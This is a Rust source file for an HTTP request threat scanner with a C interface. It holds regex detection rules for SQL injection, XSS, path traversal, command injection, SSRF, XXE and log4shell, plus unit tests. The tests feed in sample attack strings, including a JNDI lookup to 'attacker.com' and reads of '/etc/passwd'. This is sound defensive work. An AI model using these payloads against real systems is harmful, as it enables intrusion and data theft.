use once_cell::sync::Lazy;
use regex::Regex;
use std::sync::Mutex;
#[cfg(test)]
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

// Return codes (ABI contract — docs/spec/rust-ffi-modules.md §4)
const LUAGATE_OK: i32 = 0;
const LUAGATE_BUFFER_TOO_SMALL: i32 = -2;
const LUAGATE_BUDGET_EXCEEDED: i32 = -3;
const LUAGATE_INTERNAL_ERROR: i32 = -4;

// Per-request budget: 5 ms
const BUDGET_NS: u128 = 5_000_000;

// Test-only budget override.  When non-zero, budget_exceeded uses this value
// instead of BUDGET_NS so that timing-sensitive tests can run without flaking.
#[cfg(test)]
static TEST_BUDGET_NS_OVERRIDE: AtomicU64 = AtomicU64::new(0);

// Input size limits: 8 KB per field
const MAX_FIELD_LEN: usize = 8 * 1024;

struct ThreatPattern {
    threat_type: &'static str,
    rule_name: &'static str,
    pattern: Regex,
    score: f64,
}

struct Scanner {
    patterns: Vec<ThreatPattern>,
}

// Global scanner instance, initialised at most once.
static SCANNER: Lazy<Mutex<Option<Scanner>>> = Lazy::new(|| Mutex::new(None));

// ---------------------------------------------------------------------------
// Default (hardcoded) patterns — used when init is not called or file load
// fails.  These are the OWASP CRS-inspired rules described in the spec.
// ---------------------------------------------------------------------------

fn build_default_scanner() -> Scanner {
    let raw_patterns: &[(&'static str, &'static str, &'static str, f64)] = &[
        // sqli
        (
            "sqli",
            "sqli_union_select",
            r"(?i)(union\s+(all\s+)?select)",
            0.9,
        ),
        (
            "sqli",
            "sqli_or_always_true",
            r"(?i)(or\s+1\s*=\s*1|and\s+1\s*=\s*1)",
            0.8,
        ),
        (
            "sqli",
            "sqli_drop_table",
            r"(?i)(;\s*(drop|delete|insert|update)\s+)",
            0.95,
        ),
        ("sqli", "sqli_exec", r"(?i)(exec\s*\(|execute\s*\()", 0.9),
        (
            "sqli",
            "sqli_schema_leak",
            r"(?i)(information_schema|@@version|@@datadir)",
            0.85,
        ),
        // xss
        ("xss", "xss_script_tag", r"(?i)<\s*script[^>]*>", 0.9),
        ("xss", "xss_javascript_uri", r"(?i)javascript\s*:", 0.85),
        ("xss", "xss_event_handler", r"(?i)\bon\w+\s*=", 0.8),
        (
            "xss",
            "xss_img_onerror",
            r"(?i)<\s*img[^>]+onerror\s*=",
            0.9,
        ),
        (
            "xss",
            "xss_dom_sink",
            r"(?i)(document\.cookie|document\.write|eval\s*\()",
            0.85,
        ),
        // path_traversal
        (
            "path_traversal",
            "path_traversal_dotdot",
            r"(\.\.[\\/])",
            0.9,
        ),
        (
            "path_traversal",
            "path_traversal_encoded",
            r"(?i)(%2e%2e[%2f%5c])",
            0.9,
        ),
        (
            "path_traversal",
            "path_traversal_unix",
            r"(?i)(/etc/passwd|/etc/shadow|/proc/self)",
            0.95,
        ),
        (
            "path_traversal",
            "path_traversal_windows",
            r"(?i)(c:\\windows\\)",
            0.9,
        ),
        // cmd_injection
        (
            "cmd_injection",
            "cmd_injection_shell_cmd",
            r"[;&|`]\s*(ls|cat|id|whoami|uname|wget|curl|chmod|bash|sh)\b",
            0.9,
        ),
        (
            "cmd_injection",
            "cmd_injection_subshell",
            r"(?i)\$\(.*\)",
            0.85,
        ),
        ("cmd_injection", "cmd_injection_backtick", r"`[^`]+`", 0.8),
        // ssrf
        (
            "ssrf",
            "ssrf_internal_host",
            r"(?i)(https?://(localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.))",
            0.9,
        ),
        (
            "ssrf",
            "ssrf_dangerous_scheme",
            r"(?i)(file://|gopher://|dict://)",
            0.9,
        ),
        // xxe
        ("xxe", "xxe_entity_decl", r"(?i)(<!entity\s)", 0.9),
        (
            "xxe",
            "xxe_doctype_system",
            r"(?i)(<!doctype[^>]+system\s)",
            0.85,
        ),
        // log4shell
        ("log4shell", "log4shell_jndi", r"(?i)\$\{jndi\s*:", 1.0),
        ("log4shell", "log4shell_nested", r"(?i)\$\{.*:.*\{", 0.8),
        // scanner (automated scanner detection — matches common UA strings embedded in params)
        (
            "scanner",
            "scanner_tool",
            r"(?i)(sqlmap|nikto|nessus|openvas|masscan|nmap|dirbuster|gobuster|wfuzz|hydra)",
            0.9,
        ),
    ];

    let patterns = raw_patterns
        .iter()
        .filter_map(|(threat_type, rule_name, pat, score)| {
            Regex::new(pat).ok().map(|r| ThreatPattern {
                threat_type,
                rule_name,
                pattern: r,
                score: *score,
            })
        })
        .collect();

    Scanner { patterns }
}

fn budget_exceeded(elapsed: Duration) -> bool {
    #[cfg(test)]
    {
        let override_ns = TEST_BUDGET_NS_OVERRIDE.load(Ordering::Relaxed);
        if override_ns > 0 {
            return elapsed.as_nanos() > override_ns as u128;
        }
    }
    elapsed.as_nanos() > BUDGET_NS
}

// ---------------------------------------------------------------------------
// Public C API
// ---------------------------------------------------------------------------

/// Initialise the scanner.  Called once from `init_by_lua`.
///
/// `patterns_path` may be empty ("") to use hardcoded defaults.
/// Returns LUAGATE_OK (0) on success, LUAGATE_INTERNAL_ERROR (-4) on failure.
///
/// # Safety
/// `patterns_path` must be a valid pointer to `patterns_path_len` bytes, or
/// NULL when `patterns_path_len` == 0.
#[no_mangle]
pub extern "C" fn luagate_scanner_init(patterns_path: *const i8, patterns_path_len: usize) -> i32 {
    let scanner = if !patterns_path.is_null() && patterns_path_len > 0 {
        // Attempt to load patterns from the supplied directory.  Fall back to
        // hardcoded defaults on any error so the scanner is always available.
        let bytes =
            unsafe { std::slice::from_raw_parts(patterns_path as *const u8, patterns_path_len) };
        let path_str = match std::str::from_utf8(bytes) {
            Ok(s) => s,
            Err(_) => return LUAGATE_INTERNAL_ERROR,
        };
        // For now the YAML loader is a stub that always falls back to the
        // hardcoded patterns.  A full YAML parser would read the files under
        // `path_str` and merge them.  We keep the interface correct so the
        // caller does not need to change when YAML loading is added.
        eprintln!(
            "[luagate_scanner] WARNING: patterns_path '{}' specified but YAML loader is not yet \
             implemented. Using built-in hardcoded patterns only.",
            path_str
        );
        build_default_scanner()
    } else {
        build_default_scanner()
    };

    match SCANNER.lock() {
        Ok(mut guard) => {
            *guard = Some(scanner);
            LUAGATE_OK
        }
        Err(_) => LUAGATE_INTERNAL_ERROR,
    }
}

/// Scan an HTTP request for threats.
///
/// All string arguments must remain valid for the duration of the call.
/// `body` may be NULL when `body_len` == 0 (MVP: body scanning skipped).
///
/// On success returns LUAGATE_OK.  When a threat is detected
/// `threat_type_len > 0` and the caller-allocated buffers are populated.
///
/// Returns LUAGATE_BUDGET_EXCEEDED (-3) when the 5 ms budget is exceeded, or
/// LUAGATE_INTERNAL_ERROR (-4) on any other error.
///
/// # Safety
/// All non-NULL pointer arguments must be valid for the stated length.
#[no_mangle]
#[allow(clippy::too_many_arguments)]
pub extern "C" fn luagate_scan_http(
    path_raw: *const i8,
    path_raw_len: usize,
    path_normalized: *const i8,
    path_normalized_len: usize,
    query_raw: *const i8,
    query_raw_len: usize,
    query_normalized: *const i8,
    query_normalized_len: usize,
    body: *const i8,
    body_len: usize,
    threat_type_out: *mut i8,
    threat_type_cap: usize,
    threat_type_len: *mut usize,
    rule_name_out: *mut i8,
    rule_name_cap: usize,
    rule_name_len: *mut usize,
    score_out: *mut f64,
) -> i32 {
    let start = Instant::now();

    // Validate output pointer requirements.
    if threat_type_out.is_null()
        || threat_type_len.is_null()
        || rule_name_out.is_null()
        || rule_name_len.is_null()
        || score_out.is_null()
    {
        return LUAGATE_INTERNAL_ERROR;
    }

    // Initialise outputs.
    unsafe {
        *threat_type_len = 0;
        *rule_name_len = 0;
        *score_out = 0.0_f64;
    }

    // Helper function: convert a C string pointer+length into a String,
    // applying the 8 KB size limit.  Returns None on size violation.
    // Uses from_utf8_lossy for non-UTF8 input so invalid bytes do not allow
    // scan bypass (decode_partial contract from security-scanner.md).
    fn to_str_lossy(ptr: *const i8, len: usize) -> Option<(String, bool)> {
        if ptr.is_null() || len == 0 {
            return Some((String::new(), false));
        }
        if len > MAX_FIELD_LEN {
            return None; // size violation → INTERNAL_ERROR
        }
        let bytes = unsafe { std::slice::from_raw_parts(ptr as *const u8, len) };
        match std::str::from_utf8(bytes) {
            Ok(s) => Some((s.to_string(), false)),
            Err(_) => {
                // Invalid UTF-8 — lossy conversion; scan continues with
                // replacement characters so attack bytes are not silently skipped.
                eprintln!("[luagate_scanner] WARNING: invalid UTF-8 input, using lossy conversion");
                Some((String::from_utf8_lossy(bytes).into_owned(), true))
            }
        }
    }

    macro_rules! field_str {
        ($ptr:expr, $len:expr) => {
            match to_str_lossy($ptr, $len) {
                Some((s, _had_lossy)) => s,
                None => return LUAGATE_INTERNAL_ERROR,
            }
        };
    }

    let s_path_raw = field_str!(path_raw, path_raw_len);
    let s_path_norm = field_str!(path_normalized, path_normalized_len);
    let s_query_raw = field_str!(query_raw, query_raw_len);
    let s_query_norm = field_str!(query_normalized, query_normalized_len);

    // MVP: body scanning is skipped when body_len == 0.
    let _ = (body, body_len);

    // Acquire the scanner.
    let guard = match SCANNER.lock() {
        Ok(g) => g,
        Err(_) => return LUAGATE_INTERNAL_ERROR,
    };

    let scanner = match guard.as_ref() {
        Some(s) => s,
        // Scanner not initialised — fail-closed per ADR-001.
        // Startup-fatal: init_by_lua must call luagate_scanner_init before any
        // request is processed.  Auto-init is removed to prevent silent
        // recovery from misconfiguration.
        None => return LUAGATE_INTERNAL_ERROR,
    };

    // Fields to scan in evaluation order (spec §4.2):
    //   path_raw, path_normalized, query_raw, query_normalized
    let fields = [&s_path_raw, &s_path_norm, &s_query_raw, &s_query_norm];

    for pattern in &scanner.patterns {
        // Budget check per pattern.
        if budget_exceeded(start.elapsed()) {
            return LUAGATE_BUDGET_EXCEEDED;
        }

        for field in &fields {
            if field.is_empty() {
                continue;
            }
            if pattern.pattern.is_match(field) {
                let tt = pattern.threat_type.as_bytes();
                let rn = pattern.rule_name.as_bytes();

                // Threat detected — reject undersized caller buffers instead of
                // silently truncating (fail-closed: caller must not treat a
                // partial threat_type as "no threat").
                if threat_type_cap < tt.len() {
                    return LUAGATE_BUFFER_TOO_SMALL;
                }
                if rule_name_cap < rn.len() {
                    return LUAGATE_BUFFER_TOO_SMALL;
                }

                // Write threat_type into caller buffer.
                unsafe {
                    std::ptr::copy_nonoverlapping(
                        tt.as_ptr() as *const i8,
                        threat_type_out,
                        tt.len(),
                    );
                    *threat_type_len = tt.len();
                }

                // Write rule_name into caller buffer.
                unsafe {
                    std::ptr::copy_nonoverlapping(
                        rn.as_ptr() as *const i8,
                        rule_name_out,
                        rn.len(),
                    );
                    *rule_name_len = rn.len();
                }

                unsafe {
                    *score_out = pattern.score;
                }

                return LUAGATE_OK;
            }
        }
    }

    // No threat detected.
    LUAGATE_OK
}

// ---------------------------------------------------------------------------
// Unit tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn make_scan_call(path_raw: &str, query_raw: &str) -> (i32, String, String, f64) {
        // Ensure scanner is initialised for unit tests.
        {
            let mut guard = SCANNER.lock().unwrap();
            if guard.is_none() {
                *guard = Some(build_default_scanner());
            }
        }

        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            path_raw.as_ptr() as *const i8,
            path_raw.len(),
            path_raw.as_ptr() as *const i8,
            path_raw.len(),
            query_raw.as_ptr() as *const i8,
            query_raw.len(),
            query_raw.as_ptr() as *const i8,
            query_raw.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );

        let threat = if threat_len > 0 {
            let bytes: Vec<u8> = threat_buf[..threat_len].iter().map(|&b| b as u8).collect();
            String::from_utf8_lossy(&bytes).to_string()
        } else {
            String::new()
        };

        let rule = if rule_len > 0 {
            let bytes: Vec<u8> = rule_buf[..rule_len].iter().map(|&b| b as u8).collect();
            String::from_utf8_lossy(&bytes).to_string()
        } else {
            String::new()
        };

        (rc, threat, rule, score)
    }

    #[test]
    fn test_clean_request_no_threat() {
        let (rc, threat, _, score) = make_scan_call("/api/users", "id=1");
        assert_eq!(rc, 0);
        assert!(threat.is_empty());
        assert_eq!(score, 0.0);
    }

    #[test]
    fn test_budget_threshold_is_strictly_greater_than_five_ms() {
        assert!(!budget_exceeded(Duration::from_millis(5)));
        assert!(budget_exceeded(Duration::from_nanos(5_000_001)));
    }

    #[test]
    fn test_sqli_detection() {
        let (rc, threat, rule, score) =
            make_scan_call("/api/users", "id=1 UNION SELECT * FROM users");
        assert_eq!(rc, 0);
        assert_eq!(threat, "sqli");
        assert!(!rule.is_empty());
        assert!(score >= 0.8);
    }

    #[test]
    fn test_xss_detection() {
        let (rc, threat, _, _) = make_scan_call("/page", "q=<script>alert(1)</script>");
        assert_eq!(rc, 0);
        assert_eq!(threat, "xss");
    }

    #[test]
    fn test_path_traversal_detection() {
        let (rc, threat, _, _) = make_scan_call("/../../etc/passwd", "");
        assert_eq!(rc, 0);
        assert_eq!(threat, "path_traversal");
    }

    #[test]
    fn test_log4shell_detection() {
        let (rc, threat, _, score) = make_scan_call("/", "x=${jndi:ldap://attacker.com/a}");
        assert_eq!(rc, 0);
        assert_eq!(threat, "log4shell");
        assert!(score >= 0.9);
    }

    #[test]
    fn test_null_output_pointers_return_internal_error() {
        let path = "/api/test";
        let query = "id=1";
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;
        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];

        // NULL threat_type_out
        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query.as_ptr() as *const i8,
            query.len(),
            query.as_ptr() as *const i8,
            query.len(),
            std::ptr::null(),
            0,
            std::ptr::null_mut(), // NULL
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );
        assert_eq!(rc, LUAGATE_INTERNAL_ERROR);

        // NULL rule_name_out
        let rc2 = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query.as_ptr() as *const i8,
            query.len(),
            query.as_ptr() as *const i8,
            query.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            std::ptr::null_mut(), // NULL
            128,
            &mut rule_len,
            &mut score,
        );
        assert_eq!(rc2, LUAGATE_INTERNAL_ERROR);
    }

    #[test]
    fn test_field_too_large_returns_internal_error() {
        // Ensure scanner is initialised.
        {
            let mut guard = SCANNER.lock().unwrap();
            if guard.is_none() {
                *guard = Some(build_default_scanner());
            }
        }

        let oversized = "A".repeat(MAX_FIELD_LEN + 1);
        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            oversized.as_ptr() as *const i8,
            oversized.len(),
            oversized.as_ptr() as *const i8,
            oversized.len(),
            std::ptr::null(),
            0,
            std::ptr::null(),
            0,
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );
        assert_eq!(rc, LUAGATE_INTERNAL_ERROR);
    }

    #[test]
    fn test_cmd_injection_detection() {
        // Use a path that does not trigger path_traversal so cmd_injection is
        // the first matching rule.
        let (rc, threat, _, _) = make_scan_call("/api/run", "; cat /tmp/data");
        assert_eq!(rc, 0);
        assert_eq!(threat, "cmd_injection");
    }

    #[test]
    fn test_ssrf_detection() {
        let (rc, threat, _, _) = make_scan_call("/proxy", "url=http://127.0.0.1/admin");
        assert_eq!(rc, 0);
        assert_eq!(threat, "ssrf");
    }

    #[test]
    fn test_xxe_detection() {
        let (rc, threat, _, _) = make_scan_call("/upload", "data=<!entity foo system");
        assert_eq!(rc, 0);
        assert_eq!(threat, "xxe");
    }

    #[test]
    fn test_scanner_tool_detection() {
        let (rc, threat, _, _) = make_scan_call("/search", "ua=sqlmap/1.0");
        assert_eq!(rc, 0);
        assert_eq!(threat, "scanner");
    }

    #[test]
    fn test_threat_type_buffer_too_small_returns_buffer_too_small() {
        // Ensure scanner is initialised.
        {
            let mut guard = SCANNER.lock().unwrap();
            if guard.is_none() {
                *guard = Some(build_default_scanner());
            }
        }

        // XSS input — threat_type = "xss" (3 bytes); supply a 1-byte buffer.
        let path = "/page";
        let query = "q=<script>alert(1)</script>";
        let mut threat_buf = vec![0i8; 1]; // too small for "xss" (3 bytes)
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query.as_ptr() as *const i8,
            query.len(),
            query.as_ptr() as *const i8,
            query.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            1,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );
        assert_eq!(rc, LUAGATE_BUFFER_TOO_SMALL);
    }

    #[test]
    fn test_rule_name_buffer_too_small_returns_buffer_too_small() {
        // Ensure scanner is initialised.
        {
            let mut guard = SCANNER.lock().unwrap();
            if guard.is_none() {
                *guard = Some(build_default_scanner());
            }
        }

        // XSS input — rule_name = "xss_script_tag" (14 bytes); supply 1-byte buffer.
        let path = "/page";
        let query = "q=<script>alert(1)</script>";
        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 1]; // too small for "xss_script_tag" (14 bytes)
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query.as_ptr() as *const i8,
            query.len(),
            query.as_ptr() as *const i8,
            query.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            1,
            &mut rule_len,
            &mut score,
        );
        assert_eq!(rc, LUAGATE_BUFFER_TOO_SMALL);
    }

    #[test]
    fn test_init_with_patterns_path_warns_and_succeeds() {
        // Calling init with a non-empty path should succeed (falls back to
        // hardcoded patterns) and emit a warning to stderr.
        // We cannot easily capture stderr here, so we just assert the return
        // code is LUAGATE_OK to verify no regression.
        let path = "/tmp/fake_patterns";
        let rc = luagate_scanner_init(path.as_ptr() as *const i8, path.len());
        assert_eq!(rc, LUAGATE_OK);
    }

    #[test]
    fn test_non_utf8_input_uses_lossy_conversion_and_scans() {
        // Use a generous budget (500 ms) so that lossy UTF-8 conversion
        // overhead does not cause a spurious BUDGET_EXCEEDED on slow / loaded
        // systems.  This test validates lossy-conversion correctness, not
        // budget enforcement.
        TEST_BUDGET_NS_OVERRIDE.store(500_000_000, Ordering::Relaxed);

        // Ensure scanner is initialised.
        {
            let mut guard = SCANNER.lock().unwrap();
            if guard.is_none() {
                *guard = Some(build_default_scanner());
            }
        }

        // Craft a query that contains invalid UTF-8 bytes mixed with a SQLi
        // pattern.  The invalid byte (0xff) must not suppress pattern matching.
        // "id=1 UNION SELECT" with a 0xff byte prepended.
        let mut query_bytes = vec![0xffu8];
        query_bytes.extend_from_slice(b"id=1 UNION SELECT * FROM users");

        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let path = "/api/users";
        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query_bytes.as_ptr() as *const i8,
            query_bytes.len(),
            query_bytes.as_ptr() as *const i8,
            query_bytes.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );

        // Reset budget override so other tests use the real 5 ms budget.
        TEST_BUDGET_NS_OVERRIDE.store(0, Ordering::Relaxed);

        // Must return OK and detect sqli despite the leading invalid byte.
        assert_eq!(rc, LUAGATE_OK);
        assert!(
            threat_len > 0,
            "threat should be detected even with invalid UTF-8 input"
        );
        let threat_bytes: Vec<u8> = threat_buf[..threat_len].iter().map(|&b| b as u8).collect();
        let threat = String::from_utf8_lossy(&threat_bytes).to_string();
        assert_eq!(threat, "sqli");
    }

    #[test]
    fn test_uninitialized_scanner_returns_internal_error() {
        // Temporarily replace the scanner state with None to simulate an
        // uninitialized scanner (as if init_by_lua was never called).
        let saved = {
            let mut guard = SCANNER.lock().unwrap();
            guard.take()
        };

        let path = "/api/test";
        let query = "id=1";
        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            query.as_ptr() as *const i8,
            query.len(),
            query.as_ptr() as *const i8,
            query.len(),
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );

        // Restore scanner state so other tests are not affected.
        {
            let mut guard = SCANNER.lock().unwrap();
            *guard = saved;
        }

        assert_eq!(
            rc, LUAGATE_INTERNAL_ERROR,
            "uninitialized scanner must return INTERNAL_ERROR, not auto-init"
        );
    }
}
